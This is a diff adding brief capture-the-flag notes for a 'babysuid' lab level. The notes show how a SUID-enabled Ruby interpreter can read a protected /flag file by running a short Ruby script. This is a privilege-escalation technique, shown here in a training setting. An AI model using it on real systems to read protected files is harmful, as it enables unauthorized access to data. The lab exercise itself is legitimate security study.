@@ -1,0 +1,15 @@
+Read the challenge file using /challenge/babysuid_level43
+Check SUID permissions using ls -la /challenge/babysuid_level43.  
+Try to read the flag file as /usr/bin/ruby /flag but the flag will not show. 
+Write l43.ruby and run below code in a file. 
+#!/usr/bin/ruby 
+  
+aFile = File.new("/flag", "r") 
+if aFile 
+content = aFile.sysread(100) 
+puts content 
+else 
+puts "Unable to open file!" 
+end 
+
+Run file as ruby l43.ruby
